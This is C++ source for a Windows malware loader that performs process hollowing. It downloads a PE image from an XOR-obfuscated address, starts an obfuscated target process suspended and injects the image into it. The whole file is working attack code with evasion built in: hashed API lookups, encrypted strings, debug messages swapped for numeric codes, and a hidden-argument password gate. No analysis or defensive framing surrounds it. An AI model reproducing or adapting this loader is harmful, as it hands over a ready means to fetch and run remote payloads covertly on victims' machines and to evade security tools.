#include "main.hpp"

int run()
{
	LPSTR lpSourceImage = fheXOR("0703182f4f5d435c43426c445c5d5f444268455d5d57475971100a09", fXOR("@XCpZ]C", '/'));
	LPSTR lpTargetProcess = fheXOR("2c4d30081c1c0800001f03260b1f1b12016c472e0f0213423a0d17", fXOR("@XCpZ]C", '/'));
	// printf("[PROCESS HOLLOWING]\n");

	const LPVOID hFileContent = GetDownloadFileContent(lpSourceImage);
	if (hFileContent == nullptr)
		return -1;

	// printf("[+] PE file content : 0x%p\n", (LPVOID)(uintptr_t)hFileContent);

	const BOOL bPE = IsValidPE(hFileContent);
	if (!bPE)
	{
		//"[-] The PE file is not valid !"
		// printf("%i\n", -74883917);
		if (hFileContent != nullptr)
			HeapFree(GetProcessHeap(), 0, hFileContent);
		return -1;
	}

	//"[+] The PE file is valid."
	// printf("%i\n", -706595660);

	STARTUPINFOA SI;
	PROCESS_INFORMATION PI;

	ZeroMemory(&SI, sizeof(SI));
	SI.cb = sizeof(SI);
	ZeroMemory(&PI, sizeof(PI));

	// hash of createProcessA
	m_CreateProcessAPtr createProcessA = (m_CreateProcessAPtr)m_GetProcAddressEx("kernel32.dll", -486891644);
	// printf("%p\n", createProcessA);
	const BOOL bProcessCreation = createProcessA(lpTargetProcess, nullptr, nullptr, nullptr, TRUE, CREATE_SUSPENDED, nullptr, nullptr, &SI, &PI);
	if (!bProcessCreation)
	{
		// printf("[-] An error is occured when trying to create the target process !\n");
		CleanAndExitProcess(&PI, hFileContent);
		return -1;
	}

	BOOL bTarget32;
	m_isWow64ProcessPtr isWow64Process = (m_isWow64ProcessPtr)m_GetProcAddressEx("kernel32.dll", 517399457);
	isWow64Process(PI.hProcess, &bTarget32);

	ProcessAddressInformation ProcessAddressInformation = {nullptr, nullptr};
	if (bTarget32)
	{
		ProcessAddressInformation = GetProcessAddressInformation32(&PI);
		if (ProcessAddressInformation.lpProcessImageBaseAddress == nullptr || ProcessAddressInformation.lpProcessPEBAddress == nullptr)
		{
			//[-] An error is occured when trying to get the image base address of the target process
			// printf("%i\n", 497689032);
			CleanAndExitProcess(&PI, hFileContent);
			return -1;
		}
	}
	else
	{
		ProcessAddressInformation = GetProcessAddressInformation64(&PI);
		if (ProcessAddressInformation.lpProcessImageBaseAddress == nullptr || ProcessAddressInformation.lpProcessPEBAddress == nullptr)
		{
			//[-] An error is occured when trying to get the image base address of the target process
			// printf("%i\n", 497689032);
			CleanAndExitProcess(&PI, hFileContent);
			return -1;
		}
	}

	// printf("[+] Target Process PEB : 0x%p\n", ProcessAddressInformation.lpProcessPEBAddress);
	// printf("[+] Target Process Image Base : 0x%p\n", ProcessAddressInformation.lpProcessImageBaseAddress);

	const BOOL bSource32 = IsPE32(hFileContent);
	/*if (bSource32)
		//"[+] Source PE Image architecture : x86"
		printf("%i\n", -857328276);
	else
		//"[+] Source PE Image architecture : x64"
		printf("%i\n", -287736752);

	if (bTarget32)
		//"[+] Target PE Image architecture : x86"
		printf("%i\n", -446780144);
	else
		//"[+] Target PE Image architecture : x64"
		printf("%i\n", -877188627);*/

	if (bSource32 && bTarget32 || !bSource32 && !bTarget32)
		//"[+] Architecture are compatible"
		printf("\n");
	else
	{
		//"[-] Architecture are not compatible"
		// printf("%i\n", 493924443);
		return -1;
	}

	DWORD dwSourceSubsystem;
	if (bSource32)
		dwSourceSubsystem = GetSubsytem32(hFileContent);
	else
		dwSourceSubsystem = GetSubsytem64(hFileContent);

	if (dwSourceSubsystem == (DWORD)-1)
	{
		//"[-] An error is occured when trying to get the subsytem of the source image."
		// printf("%i\n", -338259789);
		CleanAndExitProcess(&PI, hFileContent);
		return -1;
	}

	// printf("[+] Source Image subsystem : 0x%X\n", (UINT)dwSourceSubsystem);

	DWORD dwTargetSubsystem;
	if (bTarget32)
		dwTargetSubsystem = GetSubsystemEx32(PI.hProcess, ProcessAddressInformation.lpProcessImageBaseAddress);
	else
		dwTargetSubsystem = GetSubsystemEx64(PI.hProcess, ProcessAddressInformation.lpProcessImageBaseAddress);

	if (dwTargetSubsystem == (DWORD)-1)
	{
		//"[-] An error is occured when trying to get the subsytem of the target process."
		// printf("%i\n", -344866931);
		CleanAndExitProcess(&PI, hFileContent);
		return -1;
	}

	// printf("[+] Target Process subsystem : 0x%X\n", (UINT)dwTargetSubsystem);

	if (dwSourceSubsystem == dwTargetSubsystem)
		//[+] Subsytems are compatible.
		printf("\n");
	else
	{
		//[-] Subsytems are not compatible.
		// printf("%i\n", -666566165);
		CleanAndExitProcess(&PI, hFileContent);
		return -1;
	}

	BOOL bHasReloc;
	if (bSource32)
		bHasReloc = HasRelocation32(hFileContent);
	else
		bHasReloc = HasRelocation64(hFileContent);

	/*if (!bHasReloc)
		//"[+] The source image doesn't have a relocation table."
		printf("%i\n", -137686673);
	else
		//"[+] The source image has a relocation table."
		printf("%i\n", -275835515);*/

	if (bSource32 && !bHasReloc)
	{
		if (RunPE32(&PI, hFileContent))
		{
			//[+] The injection has succeed !
			// printf("%i\n", -372425416);
			CleanProcess(&PI, hFileContent);
			return 0;
		}
	}

	if (bSource32 && bHasReloc)
	{
		if (RunPEReloc32(&PI, hFileContent))
		{
			//[+] The injection has succeed !
			// printf("%i\n", -372425416);
			CleanProcess(&PI, hFileContent);
			return 0;
		}
	}

	if (!bSource32 && !bHasReloc)
	{
		if (RunPE64(&PI, hFileContent))
		{
			//[+] The injection has succeed !
			// printf("%i\n", -372425416);
			CleanProcess(&PI, hFileContent);
			return 0;
		}
	}

	if (!bSource32 && bHasReloc)
	{
		if (RunPEReloc64(&PI, hFileContent))
		{
			//[+] The injection has succeed !
			// printf("%i\n", -372425416);
			CleanProcess(&PI, hFileContent);
			return 0;
		}
	}

	// printf("[-] The injection has failed !\n");

	if (hFileContent != nullptr)
		HeapFree(GetProcessHeap(), 0, hFileContent);

	if (PI.hThread != nullptr)
		CloseHandle(PI.hThread);

	if (PI.hProcess != nullptr)
	{
		m_terminateProcessPtr terminateProcess = (m_terminateProcessPtr)m_GetProcAddressEx("kernel32.dll", 126253886);
		terminateProcess(PI.hProcess, -1);
		CloseHandle(PI.hProcess);
	}
	return 0;
}

int main(int argc, char **argv)
{
	// hideWindow();
	if (argc > 1)
	{
		if (strcmp(argv[1], "-s") == 0)
		{
			if (hash(argv[2], strlen(argv[2])) == 916252251)
			{
				if (run() == -1)
				{
					return 1;
				}
			}
		}
	}

	return 0;
}
